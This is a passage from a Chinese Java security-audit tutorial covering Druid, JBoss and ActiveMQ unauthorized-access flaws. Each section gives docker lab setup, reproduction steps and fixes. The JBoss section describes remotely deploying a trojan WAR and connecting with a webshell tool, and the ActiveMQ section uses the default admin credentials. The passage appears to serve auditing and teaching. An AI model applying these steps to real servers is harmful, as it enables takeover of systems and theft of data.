**环境搭建与复现**

在项目中引入以下依赖：

```xml
<dependency>
  <groupId>com.alibaba</groupId>
  <artifactId>druid-spring-boot-starter</artifactId>
  <version>1.1.9</version>
</dependency>
```

启动项目之后，访问/druid/index.html即可

<img width="621" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/1ee90e47-f8b1-4d40-875d-172f37959c52">

审计及修复

1、升级依赖版本到执行版本，以1.2.6为例

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>druid-spring-boot-starter</artifactId>
    <version>1.2.6</version>
 </dependency>
```

2、在application.yml配置相关的认证账号

```java
spring:
  datasource:
    druid:
      stat-view-servlet:
        
        enabled: false
        #使重置功能不起作用
        reset-enable: false
        #配置访问监控view的用户名密码
        login-username: admin
        login-password: nimda
        #IP白名单 (没有配置或者为空，则允许所有访问)
        allow: 127.0.0.1,192.168.1.1
        # IP黑名单 (存在共同时，deny优先于allow)
#        deny: 192.168.10.1 

```

当在访问URL时要求输入正确的账密认证通过后，才可访问

### （四）、jboss未授权漏洞

BOSS是一个基于J2EE的开放源代码应用服务器，也是一个管理EJB的容器和服务器，默认使用8080端口监听。

JBOSS未授权访问漏洞表现为，在默认情况下无需账密就可以直接访问 **http://127.0.0.1:8080/jmx-console** 进入管理控制台，进而导致网站信息泄露、服务器被上传shell（如反弹shell，wget写webshell文件），最终网站被攻陷。该漏洞影响所有低版本【哪些版本】的JBOSS，对其下用户影响深远。

**环境搭建与复现**

使用docker直接搭建jboss4版本的环境

（1）拉取docker的jboss镜像

docker pull testjboss/jboss

（2）将镜像转换成容器，并启动容器

docker run -d-p 80:8080 testjboss/jboss

（3）搭建环境测试效果如下

<img width="488" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/22ef5f1a-321e-4c13-b71e-c08467a236e0">

使用jboss部署带有木马的war

（1）直接访问部署页面，通过addURL完成远程部署（需要准备一个能够下载到木马的web服务，这里使用的apache服务）

<img width="387" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/a6622d13-6620-4669-bc7e-9638003280d1">

（2）完成部署后，会返现web的war中多个刚刚部署的war，jboss会自动压缩该war，用户能够直接访问，说明漏洞环境搭建成功

<img width="464" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/5a169caa-3019-47c6-ad12-e88e93b05487">

（3）使用对应的木马连接工具远程连接即可

**审计及修复**

此漏洞没有任何条件限制，只要确定jboss版本为低版本，即存在该漏洞

### （五）、Active MQ未授权及弱口令漏洞

ActiveMQ是⼀款流⾏的开源消息服务器，是 Apache 出品，最流行的，能力强劲的开源消息总线。Activemq activeMQ是一种开源的,实现了JMS1.1规范的,面向消息(MOM)的中间件,为应用程序提供高效的.可扩展的.稳定的和安全的企业级消息通信。Activemq 的作用就是系统之间进行通信，原理是生产者将消息发送给ActiveMQ服务端,服务端会根据该消息对应的目标模型(p2p/topic)将消息发送给可以接受的消费者,期间默认会将数据进行持久化,并等待消费者签收消息后才会将消息删除,避免消息丢失

其主要是默认情况下，ActiveMQ服务是没有配置安全参数。恶意⼈员可以利⽤默认配置弱点发动远程命令执⾏攻击，获取服务器权限，从⽽导致数据泄露。

**环境搭建与复现**

（1）使用docker通过vulhub靶场搭建Active MQ的环境，访问8161端口，访问admin目录下，输入初始密码admin,发现成功登录后台

<img width="578" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/37d81fa4-7f9e-458a-84c5-16bd572d7dd5">

<img width="789" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/928e41dd-769e-41a2-a2a5-b290ae18b2f3">

**审计及修复**
审计方式：
如果是maven项目，通过pom.xml或对于非maven的传统项目，确定lib包查看是否引入了低版本的activemq,已经是否是使用了弱口令，同时咨询运维同事是否在服务端已经修改了弱口令或未授权的问题。
修复方式：

（1）审计activemq最新版本
（2）针对未收授权访问，可修改conf/jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true,重启服务器即可。针对弱口令，可修改conf/jetty.xml文件，bean id为securityLoginService下conf值获取用户properties,修改用户名密码，重启服务即可

## 十四、实战审计

（一）、OFCMS代码审计
（二）、ERP2.3版本代码审计
（三）、若依CMS 4.6版本代码审计
（四）、若依CMS 3.2版本代码审计
（五）、oasys 代码审计
（六）、Tmall 代码审计
（七）、vulns 代码审计



